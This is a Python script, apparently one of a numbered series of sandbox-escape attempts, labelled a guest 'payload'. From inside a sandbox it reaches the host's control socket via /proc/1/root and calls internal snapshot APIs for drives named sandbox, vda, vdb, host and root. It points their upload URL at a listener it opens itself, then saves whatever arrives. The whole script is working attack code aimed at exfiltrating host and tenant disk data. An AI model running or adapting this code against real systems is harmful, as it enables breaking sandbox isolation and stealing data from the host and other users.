# -*- coding: utf-8 -*-
"""v191 payload (guest): CreateSnapshot 上传验证 - 宿主 HTTP 监听器接收
1. 启动 HTTP 监听 127.0.0.1:18081 记录所有请求
2. CreateSnapshot driveId 变体 (sandbox/vda/vdb) baseUrl=http://127.0.0.1:18081/
3. sandboxctrl CreateSnapshot bucketBaseUrl
4. 输出监听器收到的请求详情
输出 /vercel/sandbox/v191c.out"""
import socket, time, json, os, signal, threading, re

OUT = '/vercel/sandbox/v191c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(240)

RECV = []
LOCK = threading.Lock()


def log(s, maxlen=4200):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC %d]' % len(s)
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def punix(sp, path, body, t=8):
    b = json.dumps(body).encode()
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sp)
        hdrs = 'POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/json\r\n' % path
        hdrs += 'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n' % len(b)
        s.sendall(hdrs.encode() + b)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
                if len(d) > 8000:
                    break
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        return st, d[:6000]
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


def post(ip, port, path, body, t=8):
    b = json.dumps(body).encode()
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect((ip, port))
        hdrs = 'POST %s HTTP/1.1\r\nHost: x\r\nContent-Type: application/json\r\n' % path
        hdrs += 'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n' % len(b)
        s.sendall(hdrs.encode() + b)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
                if len(d) > 8000:
                    break
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        return st, d[:6000]
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


# ============ 1: HTTP 监听器 ============
log('=== 1 listener ===')
def listener():
    try:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(('127.0.0.1', 18081))
        srv.listen(20)
        srv.settimeout(1)
        log('LISTENER UP')
        end = time.time() + 100
        while time.time() < end:
            try:
                c, a = srv.accept()
            except socket.timeout:
                continue
            c.settimeout(3)
            try:
                d = b''
                while True:
                    x = c.recv(65536)
                    if not x:
                        break
                    d += x
                    if len(d) > 2000000:
                        break
            except Exception:
                pass
            try:
                c.sendall(b'HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\n{}')
            except Exception:
                pass
            c.close()
            with LOCK:
                RECV.append(d)
                log('RECV %d bytes: %r' % (len(d), d[:300]))
        srv.close()
    except Exception as e:
        log('LISTENER EXC %s' % e)


t = threading.Thread(target=listener, daemon=True)
t.start()
time.sleep(1)

CELL = '/proc/1/root/run/cell/cell.sock'
DR = 'vercel.hive.cell.api.drives.v1.DrivesService'
CTRL = 'vercel.sandbox.api.controller.v1.ControllerService'

# ============ 2: cell.sock CreateSnapshot ============
log('=== 2 cell snapshots ===')
for did, tag in [('sandbox', 's1'), ('vda', 's2'), ('vdb', 's3'), ('host', 's4'), ('root', 's5')]:
    st, pay = punix(CELL, '/' + DR + '/CreateSnapshot',
                    {'driveId': did, 'baseUrl': 'http://127.0.0.1:18081/%s' % tag}, t=10)
    log('CELL SNAP %s -> %s %r' % (did, st, pay[:500]))
    time.sleep(1)

# ============ 3: sandboxctrl CreateSnapshot ============
log('=== 3 ctrl snapshots ===')
for did, tag in [('sandbox', 'c1'), ('vda', 'c2'), ('vdb', 'c3')]:
    st, pay = post('127.0.0.1', 23456, '/' + CTRL + '/CreateSnapshot',
                   {'driveId': did, 'bucketBaseUrl': 'http://127.0.0.1:18081/%s' % tag}, t=10)
    log('CTRL SNAP %s -> %s %r' % (did, st, pay[:500]))
    time.sleep(1)

# ============ 4: 等上传 ============
log('=== 4 wait uploads ===')
time.sleep(8)
with LOCK:
    log('TOTAL RECV %d' % len(RECV))
    for i, d in enumerate(RECV):
        log('RECV%d %d bytes hdr=%r' % (i, len(d), d[:200]))
        # 保存 body
        try:
            hb = d.split(b'\r\n\r\n', 1)
            if len(hb) > 1:
                fn = '/vercel/sandbox/v191up%d.bin' % i
                open(fn, 'wb').write(hb[1])
                log('SAVED %s %d bytes' % (fn, len(hb[1])))
        except Exception as e:
            log('SAVE EXC %s' % e)

log('V191_DONE')
f.close()
